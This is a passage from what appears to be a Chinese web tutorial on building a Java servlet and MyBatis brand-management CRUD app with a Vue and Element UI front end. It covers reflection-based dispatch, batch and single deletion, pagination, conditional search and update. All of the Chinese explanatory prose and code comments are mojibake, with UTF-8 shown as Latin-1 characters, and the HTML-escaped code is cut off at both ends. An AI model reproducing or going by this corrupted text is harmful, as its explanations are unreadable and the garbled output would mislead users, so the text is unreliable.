&#123; e.printStackTrace(); &#125; &#125; &#125; é€šè¿‡ä¸Šé¢ä»£ç å‘ç°æ ¹æ®æ–¹æ³•åè·å–å¯¹åº”æ–¹æ³•çš„ Method å¯¹è±¡æ—¶éœ€è¦æŒ‡å®šæ–¹æ³•å‚æ•°çš„å­—èŠ‚ç å¯¹è±¡ã€‚è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å°†æ–¹æ³•çš„å‚æ•°ç±»å‹è§„å®šæ­»ï¼Œè€Œæ–¹æ³•ä¸­å¯èƒ½éœ€è¦ç”¨åˆ° request å¯¹è±¡å’Œ response å¯¹è±¡ï¼Œæ‰€ä»¥æŒ‡å®šæ–¹æ³•çš„å‚æ•°ä¸º HttpServletRequest å’Œ HttpServletResponseï¼Œé‚£ä¹ˆ BrandServlet ä»£ç å°±å¯ä»¥æ”¹è¿›ä¸ºï¼š @WebServlet(&quot;/brand/*&quot;) public class BrandServlet extends BaseServlet &#123; //ç”¨æˆ·å®ç°åˆ†é¡µæŸ¥è¯¢ public void selectAll(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; //æ·»åŠ ä¼ä¸šä¿¡æ¯ public void add(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; //ä¿®æ”¹ä¼ä¸šä¿¡æ¯ public void update(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; //åˆ é™¤ä¼ä¸šä¿¡æ¯ public void delete(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; &#125; BaseServletä»£ç å¯ä»¥æ”¹è¿›ä¸ºï¼š public class BaseServlet extends HttpServlet &#123; //æ ¹æ®è¯·æ±‚çš„æœ€åä¸€æ®µè·¯å¾„æ¥è¿›è¡Œæ–¹æ³•åˆ†å‘ @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //1. è·å–è¯·æ±‚è·¯å¾„ String uri = req.getRequestURI(); // ä¾‹å¦‚è·¯å¾„ä¸ºï¼š/brand-case/brand/selectAll //2. è·å–æœ€åä¸€æ®µè·¯å¾„ï¼Œæ–¹æ³•å int index = uri.lastIndexOf(&#x27;/&#x27;); String methodName = uri.substring(index + 1); // è·å–åˆ°èµ„æºçš„äºŒçº§è·¯å¾„ selectAll //2. æ‰§è¡Œæ–¹æ³• //2.1 è·å–BrandServlet /UserServlet å­—èŠ‚ç å¯¹è±¡ Class //System.out.println(this); Class&lt;? extends BaseServlet&gt; cls = this.getClass(); //2.2 è·å–æ–¹æ³• Methodå¯¹è±¡ try &#123; Method method = cls.getMethod(methodName, HttpServletRequest.class, HttpServletResponse.class); //2.3 æ‰§è¡Œæ–¹æ³• method.invoke(this,req,resp); &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; &#125; &#125; å‰ç«¯éœ€è¦æ”¹åªæœ‰å‡ ä¸ªè®¿é—®è·¯å¾„ï¼Œè¿™é‡Œä¸åšå…·ä½“å®ç° 3.æ‰¹é‡åˆ é™¤éœ€æ±‚åˆ†æ æ‰¹é‡åˆ é™¤è¯·æ±‚ï¼Œæºå¸¦å‚æ•°ä¸º[1,2,3...]ç±»å‹çš„jsonå­—ç¬¦ä¸² åç«¯æ¥æ”¶åˆ°jsonå­—ç¬¦ä¸²åéœ€è¦å°†å…¶è½¬ä¸ºintæ•°ç»„ è°ƒç”¨BrandServiceä¸­çš„æ–¹æ³•åˆ é™¤æ•°æ® åç«¯å®ç°daoBrandMapperä¸­æ·»åŠ deleteByIds()æ–¹æ³• /** * æ‰¹é‡åˆ é™¤ * @param ids */ void deleteByIds(@Param(&quot;ids&quot;) int[] ids); serviceåœ¨BrandServiceä¸­å®ç°æ‰¹é‡åˆ é™¤çš„ä¸šåŠ¡é€»è¾‘ä»£ç  /** * æ‰¹é‡åˆ é™¤ * @param ids */ public void deleteByIds(int[] ids)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.deleteByIds(ids); sqlSession.commit(); sqlSession.close(); &#125; servletsrc/main/java/com/itheima/web/servletçš„BrandServletæ·»åŠ deleteByIdsæ–¹æ³• /** * æ‰¹é‡åˆ é™¤æ“ä½œ * @param request * @param response * @throws ServletException * @throws IOException */ public void deleteByIds(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; BufferedReader reader = request.getReader(); // è·å–jsonå­—ç¬¦ä¸² String line = reader.readLine(); System.out.println(line); int[] ids = JSON.parseObject(line, int[].class); System.out.println(ids); service.deleteByIds(ids); response.getWriter().write(&quot;success&quot;); &#125; å‰ç«¯å®ç°è·å–é€‰ä¸­æ•°æ®çš„idå€¼handleSelectionChange &lt;el-table :data=&quot;brandlist&quot; style=&quot;width: 100%&quot; :row-class-name=&quot;tableRowClassName&quot; @selection-change=&quot;handleSelectionChange&quot; &gt; å¯ä»¥çœ‹åˆ°å½“æ•°æ®è¢«é€‰ä¸­åï¼ŒmultipleSelectionä¼šå­˜æ”¾è¢«é€‰æ‹©çš„æ•°æ®å¯¹è±¡ // å¤é€‰æ¡†é€‰ä¸­åæ‰§è¡Œçš„æ–¹æ³• handleSelectionChange(val) &#123; this.multipleSelection = val; console.log(this.multipleSelection) // console.log(this.multipleSelection) &#125;, è€Œæˆ‘ä»¬æ‰€éœ€è¦çš„åªæ˜¯å¯¹è±¡çš„idå€¼ï¼Œå› æ­¤éœ€è¦éå†multipleSelectionè·å–idå€¼ // ä»_this.multipleSelectionè·å–brandçš„idå€¼ for(let i=0; i&lt;_this.multipleSelection.length;i++)&#123; let selectItem = _this.multipleSelection[i]; _this.selectedIds[i] = selectItem.id; &#125; æ‰¹é‡åˆ é™¤æç¤ºåˆ é™¤æ“ä½œä¸€èˆ¬æ¯”è¾ƒå±é™©å› æ­¤éœ€è¦è®©ç”¨æˆ·ç¡®è®¤æ˜¯å¦åˆ é™¤ï¼Œåœ¨element-uiä¸­æ‰¾åˆ°$confirmç»„ä»¶å®ç°è¯¥åŠŸèƒ½ deleteByIds()&#123; this.$confirm(&#x27;ç¡®å®šåˆ é™¤å—ï¼Ÿ&#x27;, &#x27;ç¡®è®¤ä¿¡æ¯&#x27;, &#123; distinguishCancelAndClose: true, confirmButtonText: &#x27;ç¡®å®š&#x27;, cancelButtonText: &#x27;å–æ¶ˆ&#x27; &#125;).then(() =&gt; &#123; var _this = this; // ä»_this.multipleSelectionè·å–brandçš„idå€¼ for(let i=0; i&lt;_this.multipleSelection.length;i++)&#123; let selectItem = _this.multipleSelection[i]; _this.selectedIds[i] = selectItem.id; &#125; axios(&#123; method: &#x27;post&#x27;, url:&quot;http://localhost:8080/brand-case/brand/deleteByIds&quot;, data: _this.selectedIds &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; // é‡æ–°æŸ¥è¯¢æ•°æ® _this.selectAll(); //æ˜¾ç¤ºæç¤ºæ¡† _this.$message(&#123; type: &#x27;success&#x27;, message: &#x27;åˆ é™¤æˆåŠŸ&#x27; &#125;); &#125; &#125;) &#125;).catch(() =&gt; &#123; this.$message(&#123; type: &#x27;info&#x27;, message: &quot;å–æ¶ˆåˆ é™¤&quot; &#125;) &#125;); &#125; 4.åˆ†é¡µæŸ¥è¯¢éœ€æ±‚åˆ†æåˆ†é¡µæŸ¥è¯¢sqlåˆ†é¡µæŸ¥è¯¢ä¹Ÿæ˜¯ä»æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ†é¡µå¯¹åº”çš„SQLè¯­å¥åº”è¯¥æ€ä¹ˆå†™ã€‚åˆ†é¡µæŸ¥è¯¢ä½¿ç”¨ LIMIT å…³é”®å­—ï¼Œæ ¼å¼ä¸ºï¼š==LIMIT å¼€å§‹ç´¢å¼• æ¯é¡µæ˜¾ç¤ºçš„æ¡æ•°==ã€‚ä»¥åå‰ç«¯é¡µé¢åœ¨å‘é€è¯·æ±‚æºå¸¦å‚æ•°æ—¶ï¼Œå®ƒå¹¶ä¸æ˜ç¡®å¼€å§‹ç´¢å¼•æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯å®ƒçŸ¥é“æŸ¥è¯¢ç¬¬å‡ é¡µã€‚æ‰€ä»¥ å¼€å§‹ç´¢å¼• éœ€è¦åœ¨åç«¯è¿›è¡Œè®¡ç®—ï¼Œè®¡ç®—çš„å…¬å¼æ˜¯ ï¼š==å¼€å§‹ç´¢å¼• = ï¼ˆå½“å‰é¡µç  - 1ï¼‰* æ¯é¡µæ˜¾ç¤ºæ¡æ•°== æ¯”å¦‚æŸ¥è¯¢ç¬¬ä¸€é¡µçš„æ•°æ®çš„ SQL è¯­å¥æ˜¯ï¼š select * from tb_brand limit 0,5; æŸ¥è¯¢ç¬¬äºŒé¡µçš„æ•°æ®çš„ SQL è¯­å¥æ˜¯ï¼š select * from tb_brand limit 5,5; æŸ¥è¯¢ç¬¬ä¸‰é¡µçš„æ•°æ®çš„ SQL è¯­å¥æ˜¯ï¼š select * from tb_brand limit 10,5; å‰åç«¯æ•°æ®åˆ†æåˆ†é¡µæŸ¥è¯¢åŠŸèƒ½æ—¶å€™æ¯”è¾ƒå¤æ‚çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆåˆ†ææ¸…æ¥šä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š å‰ç«¯éœ€è¦ä¼ é€’ä»€ä¹ˆå‚æ•°ç»™åç«¯ æ ¹æ®ä¸Šä¸€æ­¥å¯¹åˆ†é¡µæŸ¥è¯¢ SQL è¯­å¥åˆ†æå¾—å‡ºï¼Œå‰ç«¯éœ€è¦ç»™åç«¯ä¸¤ä¸ªå‚æ•° å½“å‰é¡µç  ï¼š currentPage æ¯é¡µæ˜¾ç¤ºæ¡æ•°ï¼špageSize åç«¯éœ€è¦å“åº”ä»€ä¹ˆæ•°æ®ç»™å‰ç«¯ ä¸Šå›¾æ˜¯åˆ†é¡µæŸ¥è¯¢é¡µé¢å±•ç¤ºçš„æ•ˆæœï¼Œä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹å‡ºéœ€è¦å“åº”ä»¥ä¸‹è”è‚¡ä»½æ•°æ® å½“å‰é¡µéœ€è¦å±•ç¤ºçš„æ•°æ®ã€‚æˆ‘ä»¬åœ¨åç«¯ä¸€èˆ¬ä¼šå­˜å‚¨åˆ° List é›†åˆä¸­ æ€»å…±è®°å½•æ•°ã€‚åœ¨ä¸Šå›¾é¡µé¢ä¸­éœ€è¦å±•ç¤ºæ€»çš„è®°å½•æ•°ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†æ•°æ®ä¹Ÿéœ€è¦ã€‚æ€»çš„é¡µé¢ elementUI çš„åˆ†é¡µç»„ä»¶ä¼šè‡ªåŠ¨è®¡ç®—ï¼Œæˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒ è€Œè¿™ä¸¤éƒ¨åˆ†éœ€è¦å°è£…åˆ° PageBean å¯¹è±¡ä¸­ï¼Œå¹¶å°†è¯¥å¯¹è±¡è½¬æ¢ä¸º json æ ¼å¼çš„æ•°æ®å“åº”å›ç»™æµè§ˆå™¨ é€šè¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬éœ€è¦å…ˆåœ¨ pojo åŒ…ä¸‹åˆ›å»º PageBean ç±»ï¼Œä¸ºäº†åšåˆ°é€šè¿‡ä¼šå°†å…¶å®šä¹‰æˆæ³›å‹ç±»ï¼Œä»£ç å¦‚ä¸‹ï¼š //åˆ†é¡µæŸ¥è¯¢çš„JavaBean public class PageBean&lt;T&gt; &#123; // æ€»è®°å½•æ•° private int totalCount; // å½“å‰é¡µæ•°æ® private List&lt;T&gt; rows; public int getTotalCount() &#123; return totalCount; &#125; public void setTotalCount(int totalCount) &#123; this.totalCount = totalCount; &#125; public List&lt;T&gt; getRows() &#123; return rows; &#125; public void setRows(List&lt;T&gt; rows) &#123; this.rows = rows; &#125; &#125; åç«¯å®ç°dao/** * åˆ†é¡µæŸ¥è¯¢ * @param begin * @param size * @return */ @Select(&quot;select * from tb_brand limit #&#123;begin&#125;, #&#123;size&#125;&quot;) @ResultMap(&quot;brandResultMap&quot;) List&lt;Brand&gt; selectByPage(@Param(&quot;begin&quot;) int begin, @Param(&quot;size&quot;) int size); /** * æŸ¥è¯¢æ€»è®°å½•æ•° * @return */ @Select(&quot;select count(*) from tb_brand&quot;) int selectTotalCount(); service /** * åˆ†é¡µæŸ¥è¯¢ * @param currentPage * @param pageSize * @return */ public PageBean&lt;Brand&gt; selectByPage(int currentPage, int pageSize)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); // æ ¹æ®å…¬å¼è®¡ç®—èµ·å§‹å€¼ int begin = (currentPage - 1) * pageSize; int size = pageSize; // è·å–è¯¥é¡µæ•°æ® List&lt;Brand&gt; rows = mapper.selectByPage(begin, size); // è·å–æ€»è®°å½•æ•° int totalCount = mapper.selectTotalCount(); // åˆ›å»ºPageBeanå¯¹è±¡ PageBean&lt;Brand&gt; pageBean = new PageBean&lt;&gt;(); pageBean.setRows(rows); pageBean.setTotalCount(totalCount); sqlSession.close(); return pageBean; &#125; servlet /** * åˆ†é¡µæŸ¥è¯¢ * @param request * @param response * @throws ServletException * @throws IOException */ public void selectByPage(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; request.setCharacterEncoding(&quot;utf-8&quot;); // 1.è·å–å½“å‰é¡µç å’Œæ¯é¡µå±•ç¤ºæ¡æ•° url?currentpage=1&amp;pagesize=5 String _currentpage = request.getParameter(&quot;currentpage&quot;); String _pagesize = request.getParameter(&quot;pagesize&quot;); int currentpage = Integer.parseInt(_currentpage); int pagesize = Integer.parseInt(_pagesize); // 2.è½¬ä¸ºjson PageBean&lt;Brand&gt; pageBean = service.selectByPage(currentpage, pagesize); String string = JSON.toJSONString(pageBean); // å“åº”æ•°æ® response.setContentType(&quot;text/json;charset=utf-8&quot;); response.getWriter().write(string); &#125; å‰ç«¯å®ç°åˆ†é¡µå·¥å…·æ¡æ”¾åœ¨è¡¨å•ä¸‹é¢ &lt;!--åˆ†é¡µå·¥å…·æ¡--&gt; &lt;el-pagination @size-change=&quot;handleSizeChange&quot; &lt;!--è®¾ç½®æ¯é¡µæ˜¾ç¤ºæ¡æ•°--&gt; @current-change=&quot;handleCurrentChange&quot; &lt;!--ä¿®æ”¹å½“å‰é¡µç --&gt; :current-page=&quot;currentPage&quot; &lt;!--ç»‘å®šcurrentPageæ¨¡å‹--&gt; :page-sizes=&quot;[5, 10, 15, 20]&quot; :page-size=&quot;5&quot; layout=&quot;total, sizes, prev, pager, next, jumper&quot; :total=&quot;totalCount&quot;&gt; &lt;!--ç»‘å®štotalCountæ¨¡å‹--&gt; &lt;/el-pagination&gt; ä¿®æ”¹handleSizeChangeå’ŒhandleCurrentChange handleSizeChange(val) &#123; // console.log(`æ¯é¡µ $&#123;val&#125; æ¡`); // è®¾ç½®æ¯é¡µæ˜¾ç¤ºæ¡æ•° this.pageSize = val; // é‡æ–°æŸ¥è¯¢ this.selectAll(); // this.currentPage=1 &#125;, handleCurrentChange(val) &#123; this.currentPage = val; &#125;, ä¿®æ”¹selectAll()å¼‚æ­¥è¯·æ±‚æ–¹æ³•ä¸»è¦ä¿®æ”¹urlå’Œè·å–å“åº”æ•°æ®åçš„å¤„ç†æ–¹å¼ selectAll()&#123; // var _this = this; // axios(&#123; // method: &#x27;GET&#x27;, // url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27; // &#125;).then(function(response)&#123; // var brandlist = response.data; // _this.brandlist = brandlist; // &#125;) var _this = this; axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/selectByPage?currentpage=&#x27;+ _this.currentPage + &#x27;&amp;pagesize=&#x27; + _this.pageSize &#125;).then(function(response)&#123; // è·å–æ•°æ® &#123;rows: &#123; &#125;,totalCount:47&#125; var brandlist = response.data.rows; // è®¾ç½®è¡¨æ ¼æ•°æ® _this.brandlist = brandlist; // è®¾ç½®æ€»è®°å½•æ•° _this.totalCount = response.data.totalCount; &#125;) &#125;, 5.å¤šæ¡ä»¶åˆ†é¡µæŸ¥è¯¢éœ€æ±‚åˆ†æ ç”¨æˆ·æäº¤æ•°æ® çŠ¶æ€ å“ç‰Œåç§° ä¼ä¸šåç§°ï¼Œ ç»‘å®šåˆ°brandæ¨¡å‹åä½œä¸ºå‚æ•°æäº¤ä¸ºåç«¯ ä¸‰ä¸ªæ¡ä»¶çš„æŸ¥è¯¢ä¸ºandå…³ç³»ï¼Œå¹¶ä¸”å¯¹å“ç‰Œå’Œä¼ä¸šçš„æŸ¥è¯¢éœ€è¦ä½¿ç”¨æ¨¡ç³ŠæŸ¥è¯¢å³éœ€è¦likeå…³é”®å­— æŸ¥è¯¢åä¾ç„¶éœ€è¦åˆ†é¡µæ˜¾ç¤ºï¼Œå› æ­¤éœ€è¦è¿”å›ç¬¦åˆæ¡ä»¶çš„æ•°æ®å¤–ï¼Œè¿˜è¦è¿”å›å¯¹åº”çš„æ•°é‡ å¯ä»¥æ ¹æ®åˆ†é¡µæŸ¥è¯¢ä¿®æ”¹ä»£ç  åç«¯å®ç°daoéœ€è¦ä¸¤ä¸ªæŸ¥è¯¢ï¼ŒselelctByConditionså’ŒselectByConditionsCount /** * å¤šæ¡ä»¶æŸ¥è¯¢ * @param brand * @param begin * @param size * @return */ List&lt;Brand&gt; selectByConditions(@Param(&quot;brand&quot;) Brand brand, @Param(&quot;begin&quot;) int begin, @Param(&quot;size&quot;) int size); /** * å¤šæ¡ä»¶æŸ¥è¯¢çš„è®°å½•æ¡æ•° * @param brand * @return */ int selectByConditionsCount(Brand brand); åœ¨å¯¹åº”çš„BrandMapper.xmlä¸­å®ç°å…·ä½“çš„æŸ¥è¯¢ &lt;select id=&quot;selectByConditions&quot; resultType=&quot;com.itheima.pojo.Brand&quot; resultMap=&quot;brandResultMap&quot;&gt; select * from tb_brand &lt;where&gt; &lt;!--è¿™é‡Œæœ‰å¤šä¸ªå‚æ•°ï¼Œè®¿é—®brandæ•°æ®å®æ—¶éœ€è¦ä½¿ç”¨brand.brandName--&gt; &lt;if test=&quot;brand.brandName != null and brand.brandName != &#x27;&#x27;&quot;&gt; and brand_name like #&#123;brand.brandName&#125; &lt;/if&gt; &lt;if test=&quot;brand.companyName != null and brand.companyName != &#x27;&#x27;&quot;&gt; and company_name like #&#123;brand.companyName&#125; &lt;/if&gt; &lt;if test=&quot;brand.status != null&quot;&gt; and status = #&#123;brand.status&#125; &lt;/if&gt; &lt;/where&gt; limit #&#123;begin&#125;, #&#123;size&#125; &lt;/select&gt; &lt;select id=&quot;selectByConditionsCount&quot; resultType=&quot;java.lang.Integer&quot;&gt; select count(*) from tb_brand &lt;where&gt; &lt;!--è¿™é‡Œä¸ºå•ä¸ªå‚æ•°ï¼Œè®¿é—®brandæ•°æ®å®æ—¶éœ€è¦ä½¿ç”¨#&#123;brandName&#125;--&gt; &lt;if test=&quot;brandName != null and brandName != &#x27;&#x27;&quot;&gt; and brand_name like #&#123;brandName&#125; &lt;/if&gt; &lt;if test=&quot;companyName != null and companyName != &#x27;&#x27;&quot;&gt; and company_name like #&#123;companyName&#125; &lt;/if&gt; &lt;if test=&quot;status != null&quot;&gt; and status = #&#123;status&#125; &lt;/if&gt; &lt;/where&gt; &lt;/select&gt; serviceåœ¨BrandServiceä¸­å®ç°å¤šæ¡ä»¶åˆ†é¡µæŸ¥è¯¢çš„ä¸šåŠ¡é€»è¾‘ /** * å¤šæ¡ä»¶åˆ†é¡µæŸ¥è¯¢ * @param currentPage * @param pageSize * @return */ public PageBean&lt;Brand&gt; selectByConditionsPage(Brand brand, int currentPage, int pageSize)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); int begin = (currentPage - 1) * pageSize; int size = pageSize; // å¯¹æ•°æ®è¿›è¡Œå¤„ç†åŠ ä¸Š % æ¨¡ç³ŠæŸ¥è¯¢è¡¨è¾¾å¼ if(brand.getBrandName() != null &amp;&amp; brand.getBrandName().length() &gt; 0 )&#123; brand.setBrandName(&quot;%&quot; + brand.getBrandName() + &quot;%&quot;); &#125; if(brand.getCompanyName() != null &amp;&amp; brand.getCompanyName().length() &gt; 0)&#123; brand.setCompanyName(&quot;%&quot; + brand.getCompanyName() + &quot;%&quot;); &#125; System.out.println(brand); List&lt;Brand&gt; rows = mapper.selectByConditions(brand, begin, size); int totalCount = mapper.selectByConditionsCount(brand); PageBean&lt;Brand&gt; pageBean = new PageBean&lt;&gt;(); pageBean.setRows(rows); pageBean.setTotalCount(totalCount); sqlSession.close(); return pageBean; &#125; servlet/** * æœç´¢ * @param request * @param response * @throws ServletException * @throws IOException */ public void search(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // 1.è·å–å½“å‰é¡µç å’Œæ¯é¡µå±•ç¤ºæ¡æ•° url?currentpage=1&amp;pagesize=5 String _currentpage = request.getParameter(&quot;currentpage&quot;); String _pagesize = request.getParameter(&quot;pagesize&quot;); int currentpage = Integer.parseInt(_currentpage); int pagesize = Integer.parseInt(_pagesize); // 2.è·å–jsonå­—ç¬¦ä¸² BufferedReader reader = request.getReader(); String line = reader.readLine(); System.out.println(line); // 3.å°†jsonå­—ç¬¦ä¸²è½¬ä¸ºbrandå¯¹è±¡ Brand brand = JSON.parseObject(line, Brand.class); System.out.println(brand); // 4.è°ƒç”¨serviceæ–¹æ³• è·å–pageBeanå¯¹è±¡ PageBean&lt;Brand&gt; pageBean = service.selectByConditionsPage(brand, currentpage, pagesize); // 5.å°†PageBeanè½¬ä¸ºJsonå­—ç¬¦ä¸² String string = JSON.toJSONString(pageBean); // 6.å‘é€å“åº”æ•°æ® response.setContentType(&quot;text/json;charset=utf-8&quot;); response.getWriter().write(string); &#125; å‰ç«¯å®ç°è·å–æŸ¥è¯¢æ¡ä»¶æŸ¥è¯¢è¡¨å•ç»‘å®šçš„æ¨¡å‹ä¸ºsearchBrand &lt;el-form :inline=&quot;true&quot; :model=&quot;searchBrand&quot; class=&quot;demo-form-inline&quot;&gt; searchBrandæ•°æ®å¦‚ä¸‹ // æœç´¢æ•°æ® searchBrand:&#123; status: &#x27;&#x27;, brandName: &#x27;&#x27;, companyName: &#x27;&#x27;, id:&quot;&quot;, ordered:&quot;&quot;, description:&quot;&quot; &#125;, å½“ç”¨æˆ·è¾“å…¥æ¡ä»¶åï¼Œæ•°æ®è‡ªåŠ¨ç»‘å®šåˆ°searchBrandæ¨¡å‹ä¸Šï¼Œå‘åå°æäº¤æ•°æ®æ—¶ï¼Œæäº¤searchBrandå³å¯ æŸ¥è¯¢çš„å¼‚æ­¥è¯·æ±‚search()&#123; var _this = this; axios(&#123; method: &#x27;POST&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/search?currentpage=&#x27;+ _this.currentPage + &#x27;&amp;pagesize=&#x27; + _this.pageSize, data: this.searchBrand &#125;).then(function(response)&#123; // è·å–æ•°æ® &#123;rows: &#123; &#125; &#125; // è®¾ç½®è¡¨æ ¼æ•°æ® _this.brandlist = response.data.rows; // è®¾ç½®æ€»è®°å½•æ•° _this.totalCount = response.data.totalCount; _this.currentPage = 1; &#125;) &#125; 6.åˆ é™¤å•æ¡æ•°æ®éœ€æ±‚åˆ†æ åˆ é™¤å•æ¡æ•°æ®æ—¶éœ€è¦æºå¸¦è¯¥æ•°æ®çš„idï¼Œä½¿ç”¨getè¯·æ±‚æ—¢å¯ è·å–idï¼Œå¯ä»¥ä½¿ç”¨scope.row.id åç«¯å®ç°dao/** * åˆ é™¤æŒ‡å®šå•†å“ * @param id */ @Delete(&quot;delete from tb_brand where id = #&#123;id&#125;&quot;) void deleteById(@Param(&quot;id&quot;) int id); service/** * åˆ é™¤æŒ‡å®šæ•°æ® * @param id */ public void deleteById(int id)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.deleteById(id); sqlSession.commit(); sqlSession.close(); &#125; servlet/** * åˆ é™¤æŒ‡å®šæ•°æ® * @param request * @param response * @throws ServletException * @throws IOException */ public void deleteById(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; String _id = request.getParameter(&quot;id&quot;); int id = Integer.parseInt(_id); service.deleteById(id); response.getWriter().write(&quot;success&quot;); &#125; å‰ç«¯å®ç°è·å–idå‚è€ƒ åœ¨ä¿®æ”¹å’Œåˆ é™¤æŒ‰é’®ä½ç½®æ·»åŠ slot-scope=&quot;scope&quot; &lt;el-row slot-scope=&quot;scope&quot;&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;update(scope.row)&quot; &gt;ä¿®æ”¹&lt;/el-button&gt; &lt;el-button type=&quot;danger&quot; @click=&quot;deleteById(scope.row.id)&quot; &gt;åˆ é™¤&lt;/el-button&gt; &lt;/el-row&gt; ä½¿ç”¨scope.row.idå³å¯è·å–åˆ°æ¯è¡Œæ•°æ®çš„id å¼‚æ­¥è¯·æ±‚åŒæ ·ä½¿ç”¨confirmç»„ä»¶æç¤ºç”¨æˆ·æ˜¯å¦çœŸçš„æƒ³åˆ é™¤ deleteById(id)&#123; this.$confirm(&#x27;ç¡®å®šåˆ é™¤å—ï¼Ÿ&#x27;, &#x27;ç¡®è®¤ä¿¡æ¯&#x27;, &#123; distinguishCancelAndClose: true, confirmButtonText: &#x27;ç¡®å®š&#x27;, cancelButtonText: &#x27;å–æ¶ˆ&#x27; &#125;).then(() =&gt; &#123; this.currentPage=1 var _this = this; var deleteId = id; axios(&#123; method: &#x27;get&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/deleteById?id=&#x27;+deleteId, &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; // é‡æ–°æŸ¥è¯¢æ•°æ® _this.selectAll(); //æ˜¾ç¤ºæç¤ºæ¡† _this.$message(&#123; type: &#x27;success&#x27;, message: &#x27;åˆ é™¤æˆåŠŸ&#x27; &#125;); &#125; &#125;) &#125;).catch(() =&gt; &#123; this.$message(&#123; type: &#x27;info&#x27;, message: &quot;å–æ¶ˆåˆ é™¤&quot; &#125;) &#125;) &#125;, 7.ä¿®æ”¹éœ€æ±‚åˆ†æ ä¿®æ”¹ä¸æ·»åŠ ç±»ä¼¼ï¼Œéœ€è¦å¼¹å‡ºå¯¹è¯æ¡†åè¿›è¡Œæ•°æ®çš„ç¼–è¾‘ å¦‚ä½•è·å–æ¯è¡Œçš„æ•°æ®ï¼Œä½¿ç”¨scope.rowå³å¯ è¯·æ±‚æ•°æ®ä¸ºjsonæ•°æ®ï¼Œåå°æ¥æ”¶åå°†å…¶è½¬æ¢ä¸ºBrandç±»å‹åè¿›è¡Œæ›´æ–°æ“ä½œ åç«¯å®ç°dao/** * æ›´æ–°æ•°æ® * @param brand */ @Update(&quot;update tb_brand set brand_name = #&#123;brandName&#125;,company_name = #&#123;companyName&#125;,ordered = #&#123;ordered&#125;,description = #&#123;description&#125;,status = #&#123;status&#125; where id = #&#123;id&#125;&quot;) @ResultMap(&quot;brandResultMap&quot;) void update(Brand brand); service/** * æ›´æ–°æ•°æ® * @param brand */ public void update(Brand brand)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.update(brand); sqlSession.commit(); sqlSession.close(); &#125; servlet/** * æ›´æ–° * @param request * @param response * @throws ServletException * @throws IOException */ public void update(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; BufferedReader reader = request.getReader(); String line = reader.readLine(); System.out.println(line); Brand brand = JSON.parseObject(line, Brand.class); System.out.println(brand); service.update(brand); response.getWriter().write(&quot;success&quot;); &#125; å‰ç«¯å®ç°ä¿®æ”¹å¯¹è¯æ¡†è¯¥å¯¹è¯æ¡†ä¸å¢åŠ å¯¹è¯çš„å®ç°ç›¸åŒï¼Œä¸è¿‡è¯¥å¯¹è¯æ¡†åˆå§‹æ—¶éœ€è¦æ˜¾ç¤ºæ•°æ® &lt;el-button type=&quot;primary&quot; @click=&quot;update(scope.row)&quot; &gt;ä¿®æ”¹&lt;/el-button&gt; updateå‡½æ•°çš„å®ç° update(data)&#123; var _this = this; this.dialogUpdateVisible = true; this.updateBrand.brandName = data.brandName; this.updateBrand.companyName = data.companyName; this.updateBrand.status = data.status; this.updateBrand.ordered = data.ordered; this.updateBrand.description = data.description; this.updateBrand.statusStr = data.statusStr; &#125;, updateBrandå®šä¹‰ data() &#123; return &#123; //å¸¦ä¿®æ”¹çš„æ•°æ® updateBrand:&#123; &quot;brandName&quot;: &quot;&quot;, &quot;companyName&quot;: &quot;&quot;, &quot;description&quot;: &quot;&quot;, &quot;id&quot;: 1, &quot;ordered&quot;: 0, &quot;status&quot;: 0, &quot;statusStr&quot;: &quot;&quot; &#125;, &#125; å¼‚æ­¥è¯·æ±‚å®ç°ä¿®æ”¹å¯¹è¯æ¡†çš„æäº¤æŒ‰é’®ä½ç½® &lt;el-form-item&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;updateSubmit&quot;&gt;æäº¤&lt;/el-button&gt; &lt;!--å–æ¶ˆ åªéœ€è¦å°†dialogVisbleè®¾ç½®ä¸ºfalseå³å¯éšè—å¯¹è¯æ¡†--&gt; &lt;el-button @click=&quot;dialogUpdateVisible = false&quot;&gt;å–æ¶ˆ&lt;/el-button&gt; &lt;/el-form-item&gt; // ä¿®æ”¹ updateSubmit()&#123; var _this = this; axios(&#123; method:&#x27;POST&#x27;, url: 